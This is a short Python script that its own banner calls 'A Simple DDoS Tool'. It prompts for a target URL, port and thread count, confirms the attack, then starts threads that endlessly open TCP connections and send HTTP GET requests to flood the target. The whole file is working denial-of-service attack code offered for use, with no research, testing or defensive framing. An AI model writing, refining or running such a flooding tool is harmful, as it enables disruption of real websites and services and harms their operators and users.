import os
import threading
import socket

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("""
 ██████                       ███                    ██████████      ██████████         ███████        █████████ 
███░░███                     ░░░                   ░░███░░░░███    ░░███░░░░███      ███░░░░░███     ███░░░░░███
░███ ░░░   ██████   ████████   ████  █████    █████ ░███   ░░███    ░███   ░░███    ███     ░░███   ░███    ░░░ 
███████    ███░░███░░███░░███ ░░███ ░░███  ░░███    ░███    ░███    ░███    ░███   ░███      ░███   ░░█████████ 
░░░███░   ░███████  ░███ ░███  ░███  ░░░█████░      ░███    ░███    ░███    ░███   ░███      ░███    ░░░░░░░░███
  ░███     ░███░░░   ░███ ░███ ░███   ███░░░███     ░███    ███     ░███    ███    ░░███     ███     ███    ░███
 █████   ░░███████  ████ █████ █████ █████  █████    ██████████  ██ ██████████   ██ ░░░███████░   ██░░█████████ 
░░░░░      ░░░░░░  ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░    ░░░░░░░░░░   ░░ ░░░░░░░░░░   ░░    ░░░░░░░    ░░  ░░░░░░░░  
                                                                                                                 
                                                                                                                 
                                                                                                                 

  A Simple DDoS Tool
    """)

def check_website(url):
    try:
        socket.gethostbyname(url)
        print("Website found:", url)
        return True
    except socket.error:
        print("Website not found:", url)
        return False

def confirm_attack():
    while True:
        response = input("Do you want to continue with the attack? (y/n): ").strip().lower()
        if response == 'y':
            return True
        elif response == 'n':
            return False
        else:
            print("Invalid input. Please enter 'y' for yes or 'n' for no.")

def ddos(url, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((url, port))
            s.send(("GET /" + url + " HTTP/1.1\r\n").encode('ascii'))
            s.send(("Host: " + url + "\r\n\r\n").encode('ascii'))
            s.close()
        except socket.error as e:
            print("Connection error:", e)

clear_screen()
print_banner()
url = input("Enter the target URL: ")
port = int(input("Enter the target port: "))
threads_count = int(input("Enter the number of threads: "))

if check_website(url):
    if confirm_attack():
        for _ in range(threads_count):
            threading.Thread(target=ddos, args=(url, port)).start()
    else:
        print("Attack aborted.")
else:
    print("Cannot proceed with the attack. Website not found.")
